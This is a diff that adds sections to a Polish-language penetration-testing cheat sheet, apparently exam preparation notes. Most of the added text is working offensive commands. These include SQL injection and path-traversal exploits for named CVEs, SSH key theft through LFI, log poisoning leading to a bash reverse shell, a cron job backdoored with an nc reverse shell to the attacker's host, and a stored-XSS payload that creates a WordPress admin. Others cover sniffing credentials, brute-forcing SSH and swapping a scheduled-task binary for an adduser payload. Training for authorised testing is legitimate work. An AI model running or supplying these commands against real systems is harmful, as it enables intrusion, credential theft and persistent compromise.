@@ -102,6 +102,15 @@ ls /usr/share/nmap/scripts/ | grep smb             # przegląd dostępnych skryp
 
 ## 1.3 Web enumeration
 
+> 🎯 **Drogowskaz — web app (co po kolei):** 1) `nmap -p80 -sV --script=http-enum` → baner + apki/foldery/listing. 2) `whatweb`/Wappalyzer + **DevTools** → stack, wersje bibliotek JS (→ CVE), ukryte inputy, komentarze. 3) dopisz host do `/etc/hosts` (linki/redirecty po nazwie). 4) gobuster/ffuf — czytaj kody: **200** jest · **301/302** katalog · **403** jest+zabronione · **405** endpoint istnieje, zła metoda (→ verb tampering). 5) odpal **Burp** (proxy 127.0.0.1:8080). 6) `/robots.txt`, `/sitemap.xml`, view-source, nagłówki. 7) każdy input testuj: SQLi/LFI/upload/cmdi/XSS.
+> 💎 **Co wartościowe:** wersje bibliotek JS (searchsploit) · directory listing ON · ukryte pola/komentarze · baner dev-server (Werkzeug/Python → exploit) · katalogi admin/backup.
+
+```bash
+sudo nmap -p80 --script=http-enum $IP                  # /login.php, znane apki (WordPress/BlogWorx), foldery admin, listing
+echo "$IP target.thm" | sudo tee -a /etc/hosts         # apki osadzają hostname w linkach/redirectach — bez wpisu "connection refused"
+```
+> **DevTools (Firefox):** Debugger → *Pretty print* de-minifikuje JS (frameworki, wersje → CVE); Inspector → ukryte `input hidden`; Console (Ctrl+Shift+K) → testuj JS.
+
 ### Gobuster
 ```bash
 gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
@@ -287,6 +296,23 @@ sudo systemctl start nessusd     # start usługi
 
 ## 2.1 Web attacks — SQL Injection
 
+> 🎯 **Drogowskaz — SQLi → RCE:** 1) **fingerprint DBMS** (`@@version`/`version()` — styl komentarzy i RCE różnią się per silnik). 2) masz creds/otwarty port? wejdź natywnie (poniżej) i enumeruj obok SQLi. 3) potwierdź injekcję (sama `'` = błąd składni) → `OR 1=1`/UNION/blind. 4) enumeruj: user → privileged? → bazy → tabele (`information_schema`/`sys.databases`), celuj w **custom** DB. 5) dump hashy → crack. 6) RCE: MSSQL `xp_cmdshell` · MySQL `INTO OUTFILE`. 7) blind/za wolno → sqlmap (głośny, na exam do identyfikacji).
+
+**Natywny klient (gdy masz creds / otwarty 3306/1433) — szybsze niż przez SQLi:**
+```bash
+mysql -u root -p'root' -h $IP -P 3306 --skip-ssl      # ERROR 2026 TLS → --skip-ssl; potem: select version(); system_user();
+#   SELECT user,authentication_string FROM mysql.user;   -- hashe MySQL8 (Caching-SHA-256) do łamania
+impacket-mssqlclient sa:Passw0rd@$IP -windows-auth     # MSSQL; SELECT name FROM sys.databases; select * FROM baza.dbo.users;
+#   pomijaj master/tempdb/model/msdb; schemat dbo między bazą a tabelą; zdalnie OMIŃ końcowe GO
+```
+
+### Blind boolean-based (inference, gdy apka różnicuje output — szybsze niż time)
+```
+offsec'                                  -- sama apostrofa = błąd składni = injekcja potwierdzona
+?user=offsec' AND 1=1 -- //              -- zwraca rekord (TRUE)
+?user=offsec' AND 1=2 -- //              -- nic (FALSE) → wnioskuj bit po bicie
+```
+
 ### Boolean-based (autoryzacja / logika)
 ```sql
 offsec' OR 1=1 -- //
@@ -380,7 +406,26 @@ http://$IP/index.php?page=/etc/passwd%00                    # null byte (stare P
 /var/www/html/config.php  /home/USER/.ssh/id_rsa  /root/.bash_history
 /var/log/apache2/access.log   /var/log/auth.log
 ```
-**Windows:** `C:\Windows\System32\drivers\etc\hosts`, `C:\Windows\win.ini`, `C:\inetpub\wwwroot\web.config`, `C:\Users\USER\.ssh\id_rsa`.
+**Windows** (testuj OBA slashe — niektóre apki podatne TYLKO na `..\`; brak listowania katalogów → znaj ścieżki):
+```
+http://$IP/index.php?page=..\..\..\..\Windows\System32\drivers\etc\hosts
+http://$IP/index.php?page=../../../../../xampp/passwords.txt          # C:\xampp\passwords.txt, apache/logs/access.log
+http://$IP/index.php?page=../../../../../inetpub/wwwroot/web.config   # IIS
+```
+**Znane CVE traversal (gotowce):**
+```bash
+curl --path-as-is http://$IP/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd   # Apache 2.4.49/50 (CVE-2021-41773); %2e omija filtr ../
+curl --data 'echo;id' 'http://$IP/cgi-bin/%2e%2e/%2e%2e/%2e%2e/bin/sh'        # ↑ RCE gdy mod_cgi on
+curl --path-as-is http://$IP:3000/public/plugins/alertlist/../../../../../../etc/passwd   # Grafana (CVE-2021-43798); loot grafana.ini
+```
+> `curl` sam normalizuje kropki → **`--path-as-is`** wysyła surową ścieżkę. Zwykłe `../` często zwraca 404 mimo podatności → ZAWSZE testuj kodowanie (`%2e`, `%2f`) zanim uznasz „niepodatne".
+
+**Traversal → kradzież klucza SSH → logowanie** (najczęstszy foothold):
+```bash
+curl 'http://$IP/index.php?page=../../../../../../home/USER/.ssh/id_rsa' -o key   # user+home z /etc/passwd
+chmod 400 key                                          # SSH odrzuca 0644 "too open"
+ssh -i key -p 2222 USER@$IP                            # port często 2222, nie 22
+```
 
 **PHP wrappers (odczyt źródła i RCE):**
 ```
@@ -395,11 +440,15 @@ expect://id
 ```
 **Log poisoning → RCE** (wstrzyknij PHP do logu, potem załaduj log przez LFI):
 ```bash
-# 1. Zatruj User-Agent
+# 1. Zatruj User-Agent (ten sam snippet działa cross-OS):
 curl -A "<?php system(\$_GET['c']); ?>" http://$IP/
-# 2. Załaduj log przez LFI
+# 2. Załaduj log przez LFI + wykonaj (spacje URL-enkoduj jako %20!):
 http://$IP/index.php?page=/var/log/apache2/access.log&c=id
+#    Windows XAMPP: page=../../../../../xampp/apache/logs/access.log&c=dir
+# 3. Reverse shell — system() woła /bin/sh (brak >&) → owiń w bash -c:
+#    &c=bash%20-c%20"bash%20-i%20>%26%20/dev/tcp/$LHOST/$LPORT%200>%261"
 ```
+> ⚠️ Log ma teraz 2 snippety → komenda wykona się **2×**. OPSEC: payload zostaje w logu na stałe → zanotuj do cleanup.
 **RFI** (gdy `allow_url_include=On`) — serwuj payload u siebie i wskaż URL:
 ```
 http://$IP/index.php?page=http://$LHOST:8000/shell.txt&c=id
@@ -430,6 +479,14 @@ GIF89a;
 AddType application/x-httpd-php .jpg
 ```
 > Uploady ASP/ASPX (IIS): `shell.aspx`, `shell.asp;.jpg`. Zawsze sprawdź gdzie ląduje plik (`/uploads/`).
+
+**Upload NIE wykonuje się? → traversal w nazwie pliku → nadpisz `authorized_keys`** (app z własnym web serverem często biegnie jako root):
+```bash
+ssh-keygen -f fileup; cp fileup.pub authorized_keys
+# w Burpie: filename="../../../../../../../root/.ssh/authorized_keys" → Forward (blind — response tylko odbija nazwę)
+ssh -p 2222 -i fileup root@$IP                         # nadpisanie authorized_keys włącza SSH roota
+```
+> **Arsenał webshelli na Kali** (do upload/RFI): `/usr/share/webshells/{php,asp,aspx,jsp}` — np. `php/simple-backdoor.php` → `?cmd=whoami`. Delivery PowerShell przez webshell: `?cmd=powershell -enc <B64>` — pamiętaj **UTF-16LE** (`[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($t))`), nie UTF-8.
 
 ## 2.6 Command Injection
 
@@ -473,6 +530,20 @@ Ruby ERB:     <%= `id` %>
 > 🔗 Metodyka i payloady per-silnik: PayloadsAllTheThings / tplmap.
 
 ## 2.8 XSS (cookie stealing + exfiltracja)
+
+**Detekcja (najpierw):** wstrzyknij znaki `< > ' " { } ;` — jeśli wracają jako `&lt;`/`%3C` = kodowane (chronione); nieskodowane = XSS.
+```html
+<script>alert(42)</script>     <!-- unikatowa liczba potwierdza, że TWÓJ inject odpalił -->
+```
+> Kontekst decyduje: między tagami potrzebujesz `<script>`; wewnątrz istniejącego JS wystarczą `' " ;`. **Sinki:** search, błędy, komentarze/recenzje, oraz nagłówki **User-Agent / X-Forwarded-For** (stored, renderowane w panelu admina — np. WP Visitors plugin). Podmień nagłówek w Burp Repeater; `200 OK` = payload zapisany.
+
+**Stored XSS → nowy admin (gdy cookie ma HttpOnly, nie ukradniesz):** XSS działa W sesji admina → sam pobiera nonce i tworzy konto.
+```bash
+# JS: GET /wp-admin/user-new.php → regex nonce → POST action=createuser&role=administrator
+# minify (jscompress) + char-encode, dostarcz w User-Agent:
+curl -i http://target --user-agent "<script>eval(String.fromCharCode(...))</script>" --proxy 127.0.0.1:8080
+```
+> Nonce chroni przed CSRF, ale nie przed XSS w uwierzytelnionej sesji. `eval(String.fromCharCode(...))` bo `' " &` psują dostarczenie przez nagłówek. Persistent → usuń konto po engagemencie (cleanup + raport).
 
 **Kradzież ciasteczka (base64-encoded payload, żeby ominąć filtry):**
 ```html
@@ -759,7 +830,12 @@ sudo python3 -m http.server 80       # hostuj klon; własny cred_server.py loguj
 ffuf -u http://$IP:5002/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt
 curl -i http://$IP:5002/users/v1                 # często zwraca listę userów / strukturę
 curl -i http://$IP:5002/users/v1/admin/password  # sprawdź endpointy „admin”
+# Wersjonowane ścieżki REST (gobuster pattern file):
+printf '{GOBUSTER}/v1\n{GOBUSTER}/v2\n' > pattern
+gobuster dir -u http://$IP:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
+gobuster dir -u http://$IP:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt   # brute pól usera (email/password)
 ```
+> **Czytaj BODY, nie tylko kod:** `404` z treścią „User not found" wciąż potwierdza istnienie. `405` = endpoint jest, zła metoda (→ verb tampering). Docsy: `/ui` lub `/console` = Swagger. Setup **Burp**: `burpsuite` → proxy `127.0.0.1:8080`, Intercept OFF → HTTP History → *Send to Repeater* (craft/replay) / *Intruder* (brute); `curl ... --proxy 127.0.0.1:8080` wpina curla do Burpa.
 ### Nadużycia
 ```bash
 # Rejestracja z mass-assignment (dopisz sobie rolę admina przez ukryte pole):
@@ -946,13 +1022,19 @@ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
 grep "CRON" /var/log/syslog
 ls -lah /etc/cron*
 cat /etc/crontab
-# Jeśli skrypt uruchamiany przez root-cron jest zapisywalny → wstrzyknij reverse shell.
 ```
 Znajdź katalogi/pliki zapisywalne przez usera:
 ```bash
 find / -writable -type d 2>/dev/null                   # zapisywalne katalogi
 find / -writable -type f 2>/dev/null | grep -v /proc    # zapisywalne pliki
 ```
+Zapisywalny skrypt uruchamiany przez root-cron → **dopisz** (nie nadpisuj!) reverse shell:
+```bash
+ls -lah /home/joe/.scripts/user_backups.sh             # -rwxrwxrw- = każdy pisze
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST 1234 >/tmp/f" >> user_backups.sh
+nc -lnvp 1234                                           # czekaj do minuty na strzał crona → potwierdź id (uid=0)
+```
+> Dopisuj przez `>>`, żeby legalny backup dalej działał. Cleanup: usuń dopisaną linię i `/tmp/f`.
 
 ### Zapisywalny /etc/passwd (nadpisanie hasła root)
 > Jeśli hash jest w 2. kolumnie /etc/passwd, ma pierwszeństwo przed /etc/shadow.
@@ -962,12 +1044,39 @@ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
 su root2                                               # hasło: w00t
 ```
 
+### Zbieranie poświadczeń lokalnie (hidden in plain view)
+> Najszybsza droga do roota bywa przez podsłuchane/zapisane hasło (`su` z wyciekiem). Enum systemu → patrz §3.1.
+```bash
+env; cat ~/.bashrc ~/.bash_history 2>/dev/null         # eksporty typu SCRIPT_CREDENTIALS=...
+watch -n 1 "ps -aux | grep pass"                       # łap krótkie procesy z hasłem w linii poleceń (sshpass -p...)
+sudo tcpdump -i lo -A | grep "pass"                    # podsłuch creds usług lokalnych (user:root,pass:lab)
+su - root                                              # spróbuj wyciekniętego hasła wprost
+```
+Pivot na inne konto SSH po wzorcu hasła (crunch → hydra):
+```bash
+crunch 6 6 -t Lab%%% > wordlist                         # 'Lab'+3 cyfry (% = cyfra); buduj z częściowego wywiadu
+hydra -l eve -P wordlist $IP -t 4 ssh -V                # -t 4 nisko, by nie zrywać SSH
+ssh eve@$IP; sudo -l
+```
+
+### Kernel exploit — pełny workflow (ostateczność)
+> Gdy sudo/SUID/cap/cron martwe. Ryzyko crasha → tylko w zakresie, najlepiej najpierw na klonie.
+```bash
+uname -r; cat /etc/issue                                # dokładny kernel + dystrybucja (dobór CVE)
+searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"
+cp /usr/share/exploitdb/exploits/linux/local/45010.c . # 45010 = CVE-2017-16995 (Ubuntu 16, kernel <4.13.9)
+scp 45010.c joe@$IP:                                    # transfer na cel
+gcc 45010.c -o exp; file exp                            # kompiluj NA celu (unika niezgodności libów); file = sprawdź arch
+./exp; id                                               # → uid=0
+```
+> `head` na `.c` czyta instrukcje kompilacji autora. Dopasuj kernel **oraz** dystrybucję. Automat-backstop: `unix-privesc-check standard > out.txt` (Kali-native, przenieś na cel).
+
 ### Inne szybkie tropy
 ```bash
 sudo -l                                                # zawsze najpierw
 find / -perm -u=s -type f 2>/dev/null                  # SUID
 getcap -r / 2>/dev/null                                # capabilities
-# Kernel exploity: uname -r  → szukaj (np. DirtyCow, DirtyPipe, PwnKit/CVE-2021-4034)
+# Grupy poboczne (id): docker/lxd → GTFOBins container-escape; DirtyPipe/PwnKit/CVE-2021-4034 wg kernela
 ```
 
 ## 4.2 Windows privesc
@@ -1030,14 +1139,41 @@ reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
 reg query HKLM /f "password" /t REG_SZ /s
 ```
 
-### Scheduled Tasks
+### Scheduled Tasks — podmiana zapisywalnej akcji (privesc)
 ```cmd
-schtasks /query /fo LIST /v                             :: lista zadań (szukaj tych jako SYSTEM z zapisywalną akcją)
+schtasks /query /fo LIST /v                             :: szukaj: Task To Run, Run As User, Next Run Time
+icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe  :: masz (F) Full? → podmień binarkę akcji
+```
+```powershell
+move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak    # backup oryginału
+iwr -Uri http://$LHOST/adduser.exe -Outfile BackendCacheCleanup.exe    # podłóż payload
+move .\BackendCacheCleanup.exe .\Pictures\
+net localgroup administrators                           # po odpaleniu tasku sprawdź efekt
+```
+> 3 pytania: (1) jaki user uruchamia task (elewacja tylko gdy uprzywilejowany), (2) czy trigger jeszcze strzeli, (3) co robi akcja. Poczekaj jeden interwał. Cleanup: przywróć `.bak`.
+```cmd
 :: Tworzenie zdalne (wymaga uprawnień):
 schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<payload>" /sc ONCE /sd 01/01/1970 /st 00:00
 schtasks /s TARGET /run /TN "THMtask1"
 schtasks /S TARGET /TN "THMtask1" /DELETE /F
 ```
+> **Payload `adduser` do hijacków** (service / DLL / scheduled task) — kompilacja na Kali (mingw):
+```bash
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe        # rdzeń: system("net user dave2 Pass123! /add"); system("net localgroup administrators dave2 /add");
+x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll   # wariant DLL (te same 2× system() w DllMain / DLL_PROCESS_ATTACH)
+```
+
+### Kernel exploit / brakujący patch (ostateczność)
+> Gdy wektory usług/tokenów/creds martwe, a patch-level niski.
+```powershell
+Get-CimInstance -Class win32_quickfixengineering | ? { $_.Description -eq "Security Update" }   # sparse lista = kandydat
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+```
+```cmd
+:: zmapuj OS build + zainstalowane KB w MSRC Update Guide → znajdź BRAKUJĄCY patch (np. CVE-2023-29360 → KB5027215)
+.\CVE-2023-29360.exe & whoami                            :: → nt authority\system
+```
+> Uruchamiaj TYLKO ze zweryfikowanym źródłem, najlepiej najpierw na klonie — kernel exploit potrafi zawiesić maszynę. Disruptive = sprawdź rules of engagement.
 
 ### Zapisane poświadczenia (hidden in plain view)
 ```cmd
